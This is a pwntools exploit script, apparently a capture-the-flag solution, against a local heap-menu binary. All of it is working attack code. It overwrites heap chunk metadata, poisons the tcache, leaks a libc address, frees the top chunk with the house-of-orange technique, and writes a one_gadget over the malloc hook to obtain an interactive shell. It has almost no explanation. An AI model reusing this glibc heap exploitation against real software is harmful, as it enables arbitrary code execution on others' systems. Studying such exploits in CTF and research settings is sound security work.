from pwn import *

p=process('./h')

slog = lambda x,y : success(' : '.join([x,hex(y)]))
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
ru = lambda x : p.recvuntil(x)
rl = lambda : p.recvline()
go = lambda : p.interactive()

def add(size,data):
    sa('>',str(1))
    sa('size',str(size))
    sa('data',data)

def edit(idx,val):
    sa('>',str(2))
    sa('index',str(idx))
    sa('byte: ',str(val))

def delete():
    sa('>',str(3))

def write_off(off, payload):
    for i in range(len(payload)):
	edit(off+i, ord(payload[i]))


sa('name','hhro')

add(0x58,"A"*0x58)
delete()
add(0x68,"A"*0x68)
delete()

add(0x58,"\x00")

edit(0x58,0x1)
edit(0x58+1,0x5)

edit(0x558,0x71)
edit(0x58+0x500+0x70,0x71)

add(0x68,"A"*8)
delete()

add(0x58,"A"*0x58)
delete()
add(0x68,"C"*0x68)
delete()

add(0x58,"Y"*0x58)
write_off(0x60,p64(0x602040))

add(0x68,"X"*10)

add(0x68,'\n')
add(0x68,'\n')

edit(0x109,0xf0)
p.recvn(0x540)

libc = u64(p.recvn(6)+'\x00'*2)-0x3ebca0
og = libc + 0x4f322
slog('libc',libc)

log.info("Trigger free via house of orange")

for i in range(29):
	add(128, "A")
	
# Overwrite top
write_off(0x88, p64(0xc71))
	
# addate to trigger free of top chunk
for i in range(24):
    add(0x70, "A")

add(0x70,"A")

log.info("Trigger second free")
for i in range(27):
	add(128, "A")

# Overwrite top
write_off(0x88, p64(0x51))

# addate to trigger free of top chunk
add(0x80, "A")

# EXPLOIT
add(0x40,"ATTACK")
write_off(0x20020,p64(libc+0x3ebc30))

add(0x20,"B")
add(0x20,p64(og))

p.sendline('1')
p.sendline('30')

go()
